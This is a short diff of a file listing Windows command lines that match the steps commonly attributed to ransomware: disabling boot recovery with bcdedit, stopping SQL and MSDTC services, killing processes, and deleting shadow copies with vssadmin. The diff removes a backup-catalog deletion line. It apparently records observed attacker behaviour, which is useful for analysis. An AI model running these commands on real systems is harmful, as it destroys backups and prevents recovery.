@@ -9,7 +9,6 @@
  net.exe net stop MSDTC
  cmd.exe %WINDIR%\system32\cmd.exe /c bcdedit /set {default} bootstatuspolicy ignoreallfailures
  cmd.exe %WINDIR%\system32\cmd.exe /c bcdedit /set {default} recoveryenabled no
- cmd.exe %WINDIR%\system32\cmd.exe /c wbadmin delete catalog -quiet
  cmd.exe %WINDIR%\system32\cmd.exe /c net stop SQLSERVERAGENT
  net.exe net stop SQLSERVERAGENT
  cmd.exe %WINDIR%\system32\cmd.exe /c net stop MSSQLSERVER
@@ -40,4 +39,5 @@ taskkill /f /im saci.exe
 taskkill /f /im mysqld.exe
 taskkill /f /im w3wp.exe
 taskkill /f /im sqlceip.exe
+
 vssadmin delete shadows /all /Quiet
